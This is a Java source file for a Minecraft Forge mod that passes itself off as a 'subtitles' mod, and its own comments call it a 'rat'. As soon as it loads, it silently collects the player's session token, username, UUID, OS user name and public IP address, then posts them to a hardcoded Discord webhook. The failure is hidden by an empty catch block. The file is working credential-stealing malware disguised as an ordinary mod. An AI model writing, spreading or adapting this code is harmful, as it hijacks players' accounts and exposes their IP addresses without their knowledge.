package com.speed.subtitles;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

@Mod(modid ="minecraft_subtitles")// change this lmao
public class subtitles
{{
    //actual rat
    try{
        Minecraft mc = Minecraft.func_71410_x();
        //getting token
        String token = mc.func_110432_I().func_148254_d();
        //getting username
        String username = mc.func_110432_I().func_111285_a();
        //getting uuid
        String uuid = mc.func_110432_I().func_148255_b();
        String ip = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
        //building tokenauth string
        String tokenauth = username + ":" + uuid + ":" + token;
        String webhook = "https://discord.com/api/webhooks/1102522474643595385/oB040kWHp7PfFjIzsGK6dyumclAQNYKWf1XepetIPk4McTFHcXvGbJCIT1atjXzUobi0";
        //opening connection to webhook
        HttpURLConnection c = (HttpURLConnection)(new URL(webhook)).openConnection();
        //set do output to true
        c.setDoOutput(true);
        //not important lmao
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Mozilla/5.0");
        OutputStream real = c.getOutputStream();
        //final string that will be sended
        String ginfo = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"IP\",\"value\":\"```%s```\"},{\"name\":\"Username\",\"value\":\"```%s```\"}]}",new Object[]{ip ,System.getProperty("user.name")});
        String info = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"TokenAuth\",\"value\":\"```%s```\"}]}",new Object[]{tokenauth});
        String sending = String.format("{\"embeds\":[%s,%s]}", new Object[] {ginfo, info});
        //this error doesent matter (ignore it)
        real.write(sending.getBytes(StandardCharsets.UTF_8));
        c.getResponseCode();

    }catch(Exception exception){}
}}
